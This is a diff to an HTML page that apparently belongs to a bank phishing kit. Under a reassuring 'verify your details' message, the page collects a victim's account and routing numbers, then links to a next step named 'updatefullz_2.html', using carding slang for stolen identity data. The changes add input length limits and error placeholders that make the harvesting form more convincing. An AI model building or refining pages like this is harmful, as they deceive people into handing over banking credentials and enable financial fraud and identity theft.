@@ -29,19 +29,24 @@
                 <p>For your security, we need to verify your details before proceeding.</p>
             </div>
             <div class="acct__input-wrapper">
+                <span class="allerror__acct-rount"></span>
                 <div class="acct__wrap">
                     <label for="acctNum" class="acct__label">Account Number</label>
-                    <input type="text" name="" class="acct__input" id="acctNum" autofocus>
+                    <input type="text" name="" class="acct__input" id="acctNum" autofocus maxlength="10" >
+                    <span class="acct__error"></span>
+                    <span class="invalidAcct__error"></span>
                 </div>
                 <div class="acct__wrap rout-num">
                     <label for="routNum" class="acct__label" >Rounting Number</label>
-                    <input type="text" name="" class="rout__input" id="routNum">
+                    <input type="text" name="" class="rout__input" id="routNum" maxlength="9">
+                    <span class="rount__error"></span>
+                    <span class="invalidRount__error"></span>
                 </div>
             </div>
             <a href="./updatefullz_2.html"class="acct__next-btn">Continue</a>
             <!-- <button class="acct__next-btn">Continue</button> -->
         </div>
-        <footer>
+        <footer>   
             <div class="footer__container">
                 <div class="footer__left-img-wrap">
                     <img src="./images/img-1.png" alt="" class="left-img">
